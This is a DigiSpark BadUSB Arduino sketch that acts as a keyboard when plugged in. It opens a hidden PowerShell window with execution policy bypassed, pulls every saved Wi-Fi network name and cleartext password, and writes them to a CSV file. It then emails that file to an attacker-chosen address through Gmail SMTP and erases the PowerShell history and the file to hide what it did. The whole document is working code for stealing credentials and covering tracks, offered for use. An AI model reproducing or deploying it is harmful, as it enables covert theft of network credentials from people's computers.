//This DigiSpark script writes the wireless network credentials to a csv file and emails it.
//Credits to p0wc0w.

//NOTE about the New Version of this script: The older script stopped working on newer builds of Windows 10
//since Windows 10 now require an elevated cmd or powershell to execute these commands. This version should
//be faster (better, stronger...) and should work on all builds of Windows 10. For previous versions 
//of Windows or simply older builds of Windows 10, the other version works like a charm.

//Update Notes:
//As this is a longer script, powershell config has changed to lessen the on screen footprint.
//Debug "mode" has been added for troubleshooting user settings
//User Variables section added with comments
//Cred handling moved to securestring as that seems to be more reliable with many smtp providers

//If you are using gmail, you MUST enable "Less Secure App Access" in your user account settings or this will fail.

#include "DigiKeyboard.h"
void setup() {
}

//uncomment to run live
  char mode[] = "powershell -nop -win h -noni -exec bypass";
  char separator[] = "exit";
//end live

//uncomment to debug
//  char mode[] = "powershell -nop -exec bypass";
//  char separator[] = "read-host";
// end debug

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(mode);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv -Path $env:userprofile\\temp.csv;"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);

// User variables start

  //from email address:
  DigiKeyboard.print(F("$email = \"YOUREMAIL@gmail.com\";"));
  //to email address
  DigiKeyboard.print(F("$addressee = \"TOEMAIL@DOMAIN.TLD\";"));
  //if you want to change the path of the temp csv file
  DigiKeyboard.print(F("$tempcsv = \"$env:userprofile\\temp.csv\";"));
  //'from address' email account password
  DigiKeyboard.print(F("$pass = \"YOUREMAIL_PASSWORD\";"));
  //smtp server
  DigiKeyboard.print(F("$smtpServer = \"smtp.gmail.com\";"));
  //smtp server port
  DigiKeyboard.print(F("$port = \"587\";"));

// User variables end
  
  DigiKeyboard.print(F("$securestring = $pass | ConvertTo-SecureString -AsPlainText -Force;"));
  DigiKeyboard.print(F("$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $email, $securestring;"));
  DigiKeyboard.print(F("$msg = new-object Net.Mail.MailMessage;"));
  DigiKeyboard.print(F("$smtp = new-object Net.Mail.SmtpClient($smtpServer, $port);"));
  DigiKeyboard.print(F("$smtp.EnableSsl = $true;"));
  DigiKeyboard.print(F("$msg.From = \"$email\";"));
  DigiKeyboard.print(F("$msg.To.Add(\"$addressee\");"));
  DigiKeyboard.print(F("$msg.Attachments.Add(\"$tempcsv\");"));
  DigiKeyboard.print(F("$msg.BodyEncoding = [system.Text.Encoding]::Unicode;"));
  DigiKeyboard.print(F("$msg.SubjectEncoding = [system.Text.Encoding]::Unicode;"));
  DigiKeyboard.print(F("$msg.IsBodyHTML = $true ;"));
  DigiKeyboard.print(F("$msg.Subject = \"Digi-WP-Mail Form\";"));
  DigiKeyboard.print(F("$msg.Body = \"<h2> CSV Wifi Profile Info </h2></br>See attached...\"; "));
  DigiKeyboard.print(F("$SMTP.Credentials = $cred;"));
  DigiKeyboard.print(F("$smtp.Send($msg);"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(separator);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(mode);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("del (Get-PSReadlineOption).HistorySavePath;"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("rm \"$env:userprofile\\temp.csv\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(separator);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
